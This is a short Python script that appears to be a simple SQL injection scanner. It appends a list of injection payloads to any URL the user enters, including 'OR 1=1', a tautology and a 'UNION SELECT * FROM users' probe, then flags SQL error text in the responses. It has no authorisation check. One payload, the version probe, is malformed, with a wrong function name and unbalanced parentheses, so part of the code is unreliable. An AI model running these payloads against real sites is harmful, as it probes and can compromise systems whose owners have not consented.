import requests
import re

def sql_injection_scanner(url, payloads):
    vulnerable = False
    for payload in payloads:
        try:
            response = requests.get(url + payload, timeout=5)
            if response.status_code == 200:
                if re.search(r"SQL syntax|mysql error|Warning:", response.text, re.IGNORECASE):
                    print(f"Potential SQL injection vulnerability detected: {url + payload}")
                    vulnerable = True
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
    return vulnerable

def main():
    url = input("Enter the URL to scan: ")
    payloads = [
        "' OR 1=1 --",
        "' OR 'a'='a' --",
        " UNION SELECT * FROM users --",
        " AND SUBSTRING_VERSION (),1,1)='M' --"
    ]
    if sql_injection_scanner(url, payloads):
        print(f"The URL {url} is potentially vulnerable to SQL injection attacks.")
    else:
        print(f"The URL {url} does not appear to be vulnerable to SQL injection attacks.")

if __name__ == "__main__":
    main()
